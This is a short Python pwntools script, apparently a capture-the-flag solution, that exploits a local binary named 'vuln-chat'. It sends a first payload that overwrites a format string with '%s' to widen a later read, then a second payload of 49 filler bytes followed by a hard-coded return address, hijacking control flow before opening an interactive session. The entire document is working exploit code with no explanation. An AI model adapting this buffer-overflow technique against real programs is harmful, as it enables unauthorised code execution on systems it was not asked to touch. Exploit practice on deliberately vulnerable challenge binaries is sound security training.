from pwn import *

target =process('./vuln-chat')
print target.recvline()
print target.recvuntil(': ')

payload1=""
payload1+="A"*20
payload1+='%s'

target.sendline(payload1)

print target.recvuntil("I know I can trust you?")

payload2 = ""
payload2 += "1"*49 
payload2+='\x6b\x85\x04\x08'

target.sendline(payload2)

target.interactive()


